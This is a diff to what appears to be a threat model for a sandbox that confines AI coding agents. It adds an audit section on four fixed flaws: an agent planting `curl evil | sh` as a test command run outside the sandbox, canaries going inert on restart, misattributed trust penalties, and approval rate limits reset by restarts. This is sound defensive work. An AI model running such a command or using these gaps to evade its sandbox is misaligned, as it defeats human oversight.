@@ -2,6 +2,22 @@
 
 Three threat classes, antagonised in order. Each attack vector is marked with its status: **closed** (mitigated by construction or commitment), **mitigated** (reduced but not eliminated), or **residual** (documented, cannot be closed without larger architecture changes).
 
+## Found-then-fixed (full audit, Aug 2026)
+
+A full code audit after P0–P4 found four real vectors in the daemon's trusted-path plumbing. All are fixed; recorded here so the mistakes are not repeated.
+
+### F1. Agent→daemon command injection via `test_cmd`
+The daemon's test re-run read `.reliary/castellan.toml` from the project — inside the agent's write roots — and executed `[proof] test_cmd` via `sh -c` **outside the envelope**. An agent could write `test_cmd = "curl evil | sh"` and wait for the user's `keep`. **Fixed:** the config's sha256 is pinned into the Session at spawn; a changed or absent-at-launch config refuses the test run and emits a `config_drift` event. Verified live: tampered `test_cmd` does not execute.
+
+### F2. Canary trip wire lost on daemon restart
+Honeypot secret→session registration was in-memory only. After any restart, all planted canaries were silently inert (planting refuses to overwrite, so replanting was impossible). **Fixed:** registrations append to `castellan/canary.jsonl` and reload at honeypot start.
+
+### F3. Trust/bless signals misattributed to `/`
+Forged-nonce and post-kill canary-trip paths floored the trust of the `/` sentinel — punishing a path that protects nothing, while the real project went unpunished. **Fixed:** no floor without attribution; the durable session json (persisted at spawn) resolves project/harness for finished sessions; unattributable events are recorded (ledger/spine) and alerted.
+
+### F4. Bless rate limits advisory in practice
+Counters counted pending requests only (approval removed the record, resetting counts) and state was in-memory (restart = full bypass). **Fixed:** append-only `castellan/bless.jsonl` ledger; per-session cap counts non-rejected entries; per-project daily cap counts approvals; cooling-off uses the ledger max timestamp. All survive restarts.
+
 ## Threat A — Agent pulls its own levers
 
 The agent tries to disable, widen, or escape the safety system.
